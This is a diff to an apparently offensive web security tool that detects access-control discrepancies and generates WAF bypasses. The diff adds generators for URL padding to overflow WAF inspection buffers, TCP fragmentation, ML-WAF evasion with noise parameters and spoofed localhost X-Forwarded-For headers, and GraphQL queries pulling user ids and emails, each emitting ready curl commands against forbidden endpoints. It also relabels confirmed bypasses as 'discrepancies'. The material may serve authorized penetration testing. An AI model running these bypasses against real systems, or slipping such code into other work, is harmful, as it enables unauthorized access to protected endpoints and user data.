@@ -1270,9 +1270,9 @@ class ProgressiveStackAnalyzer:
                     'behavioral_paths': []
                 },
                 'django': {
-                    'headers': ['x-frame-options'],
-                    'body_patterns': ['django', 'csrfmiddlewaretoken'],
-                    'behavioral_paths': ['/admin']
+                    'headers': [],  # x-frame-options is too generic (used by many frameworks)
+                    'body_patterns': ['django', 'csrfmiddlewaretoken', 'django-debug-toolbar'],
+                    'behavioral_paths': ['/admin', '/django-admin', '/__debug__']
                 },
                 'flask': {
                     'headers': ['server:.*werkzeug', 'server:.*python'],
@@ -1531,7 +1531,7 @@ class ProgressiveStackAnalyzer:
                     'tech_headers': {},
                 },
                 'craft_cms': {
-                    'headers': ['x-powered-by'],
+                    'headers': [],  # x-powered-by alone is too generic; value must match
                     'cookies': ['CraftSessionId', 'CRAFT_CSRF_TOKEN'],
                     'body_patterns': ['craft.app', 'craftcms', 'Craft CMS'],
                     'behavioral_paths': ['/admin', '/index.php?p=admin'],
@@ -3766,7 +3766,11 @@ class DiscrepancyTester:
 
     def __init__(self, target_url: str, forbidden_endpoint: str, session: requests.Session, stack_analyzer: ProgressiveStackAnalyzer):
         self.target_url = target_url.rstrip('/')
-        self.forbidden_endpoint = forbidden_endpoint
+        # Build full URL if only a path was passed (e.g. "/api/Users/")
+        if forbidden_endpoint and not forbidden_endpoint.startswith('http'):
+            self.forbidden_endpoint = self.target_url + forbidden_endpoint
+        else:
+            self.forbidden_endpoint = forbidden_endpoint
         self.session = session
         self.stack_analyzer = stack_analyzer
         self.discrepancies = []
@@ -3776,7 +3780,7 @@ class DiscrepancyTester:
 
         # Additional attributes for advanced tests
         self.parsed_url = urlparse(target_url)
-        self.discovered_forbidden_endpoint = forbidden_endpoint
+        self.discovered_forbidden_endpoint = self.forbidden_endpoint
         self.skip_forbidden_tests = not forbidden_endpoint
 
         # Use auto-detected protocols from stack analyzer
@@ -4254,7 +4258,7 @@ class DiscrepancyTester:
                     is_confirmed_bypass = status in [200, 201, 202, 204]
                     severity = 'CRITICAL' if is_confirmed_bypass else 'LOW'
                     disc_type = 'Header Confusion Bypass' if is_confirmed_bypass else 'Header Confusion Discrepancy'
-                    label = '[!] Bypass Confirmed' if is_confirmed_bypass else '[~] Discrepancy (not a bypass)'
+                    label = '[~] Discrepancy Confirmed' if is_confirmed_bypass else '[~] Discrepancy (not a bypass)'
                     self.discrepancies.append({
                         'type': disc_type,
                         'test_name': test['name'],
@@ -4338,7 +4342,7 @@ class DiscrepancyTester:
                         entry['note'] = note
                     self.discrepancies.append(entry)
 
-                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
+                    label = '~ Discrepancy Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                     print(f"    {label}: {method} → {response.status_code}")
             except Exception as e:
                 results[method] = f"Error: {str(e)}"
@@ -4488,7 +4492,7 @@ class DiscrepancyTester:
                         'severity': 'HIGH' if is_confirmed_bypass else 'LOW',
                         'is_confirmed_bypass': is_confirmed_bypass,
                     })
-                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
+                    label = '~ Discrepancy Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                     print(f"    {label}: {variant} → {response.status_code}")
             except Exception as e:
                 pass
@@ -4517,7 +4521,7 @@ class DiscrepancyTester:
                     'severity': 'MEDIUM' if is_confirmed_bypass else 'LOW',
                     'is_confirmed_bypass': is_confirmed_bypass,
                 })
-                label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
+                label = '~ Discrepancy Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                 print(f"    {label}: HTTP/1.0 → {response.status}")
             
             conn.close()
@@ -4574,7 +4578,7 @@ class DiscrepancyTester:
                         'severity': 'HIGH' if is_confirmed_bypass else 'LOW',
                         'is_confirmed_bypass': is_confirmed_bypass,
                     })
-                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
+                    label = '~ Discrepancy Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                     print(f"    {label}: encoding → {response.status_code}")
             except Exception as e:
                 pass
@@ -4646,7 +4650,7 @@ class DiscrepancyTester:
                         'severity': 'HIGH' if is_confirmed_bypass else 'LOW',
                         'is_confirmed_bypass': is_confirmed_bypass,
                     })
-                    label = '✅ Bypass Confirmed' if is_confirmed_bypass else '~ Discrepancy'
+                    label = '~ Discrepancy Confirmed' if is_confirmed_bypass else '~ Discrepancy'
                     print(f"    {label}: {headers.get('Content-Type', '')} → {response.status_code}")
             except Exception as e:
                 pass
@@ -5880,7 +5884,7 @@ class DiscrepancyTester:
                     })
                     if is_confirmed_bypass:
                         confirmed += 1
-                        print(f"    ✅ Bypass Confirmed [{mp}] {desc} → {status}")
+                        print(f"    ~ Discrepancy Confirmed [{mp}] {desc} → {status}")
                     else:
                         discrepancies += 1
             except Exception:
@@ -5918,13 +5922,13 @@ class DiscrepancyTester:
                     })
                     if is_confirmed_bypass:
                         confirmed += 1
-                        print(f"    ✅ Bypass Confirmed [{mp}] {desc} (GET) → {status}")
+                        print(f"    ~ Discrepancy Confirmed [{mp}] {desc} (GET) → {status}")
                     else:
                         discrepancies += 1
             except Exception:
                 pass
 
-        print(f"    📊 Anchor Tag Mutations: {confirmed} confirmed bypasses, "
+        print(f"    📊 Anchor Tag Mutations: {confirmed} confirmed discrepancies, "
               f"{discrepancies} discrepancies out of {len(mutations)} mutations tested")
 
     # ========================================================================
@@ -6948,6 +6952,14 @@ class BypassGenerator:
                 self._generate_semantic_evolutionary_bypass(discrepancy)
             elif bypass_type == 'Graph Optimized Bypass':
                 self._generate_graph_optimized_bypass(discrepancy)
+            elif bypass_type == 'Buffer Boundary':
+                self._generate_buffer_boundary_bypass(discrepancy)
+            elif bypass_type == 'TCP Fragmentation':
+                self._generate_tcp_fragmentation_bypass(discrepancy)
+            elif bypass_type == 'ML WAF Evasion':
+                self._generate_ml_evasion_bypass(discrepancy)
+            elif bypass_type == 'GraphQL-REST Confusion':
+                self._generate_graphql_rest_bypass(discrepancy)
         
         print(f"\n  ✅ Generated {len(self.bypasses)} bypass techniques")
         return self.bypasses
@@ -7273,6 +7285,124 @@ class BypassGenerator:
             ),
             'curl_command': self._generate_curl(
                 url, discrepancy.get('method', 'GET'), headers
+            ),
+            'causal_trace': self._make_causal_trace(discrepancy),
+        }
+        if not self._is_semantic_duplicate(bypass):
+            self.bypasses.append(bypass)
+
+    def _generate_buffer_boundary_bypass(self, discrepancy: Dict):
+        """Generate bypasses from Buffer Boundary discrepancy (large URL accepted by backend)."""
+        forbidden_url = discrepancy.get('forbidden_url', discrepancy.get('url', ''))
+        if not forbidden_url:
+            return
+        # Try path padding to push past WAF inspection limits
+        parsed = urllib.parse.urlparse(forbidden_url)
+        path = parsed.path
+        for padding_size in [256, 512, 2048]:
+            padding = 'A' * padding_size
+            padded_url = f"{parsed.scheme}://{parsed.netloc}{path}?padding={padding}"
+            bypass = {
+                'id': f"bypass_{len(self.bypasses) + 1}",
+                'type': 'Buffer Boundary',
+                'discrepancy': discrepancy,
+                'severity': 'MEDIUM',
+                'method': 'GET',
+                'url': padded_url,
+                'headers': {},
+                'source': 'buffer_boundary',
+                'description': f"Buffer boundary bypass — URL padded to overflow WAF inspection buffer ({padding_size} bytes padding)",
+                'curl_command': self._generate_curl(padded_url, 'GET', {}),
+                'causal_trace': self._make_causal_trace(discrepancy),
+            }
+            if not self._is_semantic_duplicate(bypass):
+                self.bypasses.append(bypass)
+
+    def _generate_tcp_fragmentation_bypass(self, discrepancy: Dict):
+        """Generate bypass suggestion for TCP fragmentation (requires network-level tool)."""
+        payload = discrepancy.get('payload', {})
+        forbidden_url = discrepancy.get('forbidden_url', discrepancy.get('url', ''))
+        if not forbidden_url:
+            return
+        bypass = {
+            'id': f"bypass_{len(self.bypasses) + 1}",
+            'type': 'TCP Fragmentation',
+            'discrepancy': discrepancy,
+            'severity': 'HIGH',
+            'method': 'GET',
+            'url': forbidden_url,
+            'headers': {},
+            'source': 'tcp_fragmentation',
+            'description': (
+                "TCP fragmentation bypass — split HTTP request across TCP segments to evade "
+                "WAF deep-packet inspection. Requires low-level socket or scapy."
+            ),
+            'manual_payload': payload,
+            'curl_command': f"# TCP fragmentation requires raw socket — use scapy or fragrouter\n"
+                            f"# Target: {forbidden_url}\n"
+                            f"# Part 1: {payload.get('part1', 'GET /adm')}\n"
+                            f"# Part 2: {payload.get('part2', 'in HTTP/1.1...')}",
+            'causal_trace': self._make_causal_trace(discrepancy),
+        }
+        if not self._is_semantic_duplicate(bypass):
+            self.bypasses.append(bypass)
+
+    def _generate_ml_evasion_bypass(self, discrepancy: Dict):
+        """Generate bypass from ML WAF Evasion discrepancy (context window overflow)."""
+        forbidden_url = discrepancy.get('forbidden_url', discrepancy.get('url', ''))
+        if not forbidden_url:
+            return
+        parsed = urllib.parse.urlparse(forbidden_url)
+        path = parsed.path
+        # Technique: inflate the request with irrelevant tokens to exceed ML model context window
+        noise = 'a=1&' * 200  # large query string of meaningless params
+        evasion_url = f"{parsed.scheme}://{parsed.netloc}{path}?{noise}"
+        bypass = {
+            'id': f"bypass_{len(self.bypasses) + 1}",
+            'type': 'ML WAF Evasion',
+            'discrepancy': discrepancy,
+            'severity': 'HIGH',
+            'method': 'GET',
+            'url': evasion_url,
+            'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
+            'source': 'ml_evasion',
+            'description': (
+                "ML WAF evasion — context window overflow: inflate request with 200+ "
+                "noise parameters to push the actual attack token past the model's inspection window"
+            ),
+            'curl_command': self._generate_curl(
+                evasion_url, 'GET', {'X-Forwarded-For': '127.0.0.1'}
+            ),
+            'causal_trace': self._make_causal_trace(discrepancy),
+        }
+        if not self._is_semantic_duplicate(bypass):
+            self.bypasses.append(bypass)
+
+    def _generate_graphql_rest_bypass(self, discrepancy: Dict):
+        """Generate bypass from GraphQL batch query accepted on REST endpoint."""
+        forbidden_url = discrepancy.get('forbidden_url', discrepancy.get('url', ''))
+        if not forbidden_url:
+            return
+        parsed = urllib.parse.urlparse(forbidden_url)
+        path = parsed.path
+        graphql_url = f"{parsed.scheme}://{parsed.netloc}/graphql"
+        bypass = {
+            'id': f"bypass_{len(self.bypasses) + 1}",
+            'type': 'GraphQL-REST Confusion',
+            'discrepancy': discrepancy,
+            'severity': 'MEDIUM',
+            'method': 'POST',
+            'url': graphql_url,
+            'headers': {'Content-Type': 'application/json'},
+            'source': 'graphql_rest_confusion',
+            'description': (
+                f"GraphQL-REST gateway confusion — REST endpoint '{path}' also "
+                "accessible via GraphQL batching. WAF may not inspect GraphQL POST body."
+            ),
+            'body': f'{{"query":"{{ users {{ id email }} }}"}}',
+            'curl_command': (
+                f"curl -i -X POST -H 'Content-Type: application/json' "
+                f"-d '{{\"query\":\"{{ users {{ id email }} }}\"}}' '{graphql_url}'"
             ),
             'causal_trace': self._make_causal_trace(discrepancy),
         }
